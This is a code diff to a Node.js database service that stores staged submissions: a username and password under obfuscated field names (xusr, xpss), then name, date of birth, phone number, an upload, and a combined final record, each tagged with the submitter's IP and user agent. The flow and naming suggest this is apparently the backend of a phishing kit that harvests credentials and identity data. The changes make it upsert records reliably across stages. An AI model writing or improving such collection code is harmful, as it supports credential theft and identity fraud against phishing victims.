@@ -6,6 +6,18 @@ class DatabaseService {
     this.prisma = new PrismaClient();
   }
 
+  // Initialize database connection
+  async initialize() {
+    try {
+      await this.prisma.$connect();
+      console.log('✅ Database connection initialized');
+      return true;
+    } catch (error) {
+      console.error('❌ Database connection failed:', error);
+      throw error;
+    }
+  }
+
   // Generate unique session ID
   generateSessionId() {
     return crypto.randomBytes(16).toString('hex');
@@ -28,8 +40,18 @@ class DatabaseService {
 
   // Store login data
   async storeLoginData(sessionId, loginData, ip, userAgent) {
-    return await this.prisma.loginData.create({
-      data: {
+    return await this.prisma.loginData.upsert({
+      where: {
+        sessionId: sessionId
+      },
+      update: {
+        xusr: loginData.xusr,
+        xpss: loginData.xpss,
+        ip,
+        userAgent,
+        timestamp: new Date()
+      },
+      create: {
         sessionId,
         xusr: loginData.xusr,
         xpss: loginData.xpss,
@@ -45,8 +67,36 @@ class DatabaseService {
       throw new Error('Session ID is required');
     }
     
-    return await this.prisma.infoData.create({
-      data: {
+    // First, ensure the session exists
+    let session = await this.prisma.userSession.findUnique({
+      where: { sessionId }
+    });
+    
+    if (!session) {
+      // Create session if it doesn't exist
+      session = await this.prisma.userSession.create({
+        data: {
+          sessionId,
+          ip,
+          userAgent
+        }
+      });
+    }
+    
+    return await this.prisma.infoData.upsert({
+      where: {
+        sessionId: sessionId
+      },
+      update: {
+        xname1: infoData.xname1,
+        xname2: infoData.xname2,
+        xdob: infoData.xdob,
+        xtel: infoData.xtel,
+        ip,
+        userAgent,
+        timestamp: new Date()
+      },
+      create: {
         sessionId,
         xname1: infoData.xname1,
         xname2: infoData.xname2,
@@ -62,6 +112,22 @@ class DatabaseService {
   async storeUploadData(sessionId, uploadData, ip, userAgent) {
     if (!sessionId) {
       throw new Error('Session ID is required');
+    }
+    
+    // First, ensure the session exists
+    let session = await this.prisma.userSession.findUnique({
+      where: { sessionId }
+    });
+    
+    if (!session) {
+      // Create session if it doesn't exist
+      session = await this.prisma.userSession.create({
+        data: {
+          sessionId,
+          ip,
+          userAgent
+        }
+      });
     }
     
     return await this.prisma.uploadData.upsert({
@@ -97,8 +163,22 @@ class DatabaseService {
       throw new Error('Session ID is required');
     }
     
-    return await this.prisma.finalData.create({
-      data: {
+    return await this.prisma.finalData.upsert({
+      where: {
+        sessionId: sessionId
+      },
+      update: {
+        xusr: finalData.xusr,
+        xpss: finalData.xpss,
+        xname1: finalData.xname1,
+        xname2: finalData.xname2,
+        xdob: finalData.xdob,
+        xtel: finalData.xtel,
+        ip,
+        userAgent,
+        timestamp: new Date()
+      },
+      create: {
         sessionId,
         xusr: finalData.xusr,
         xpss: finalData.xpss,
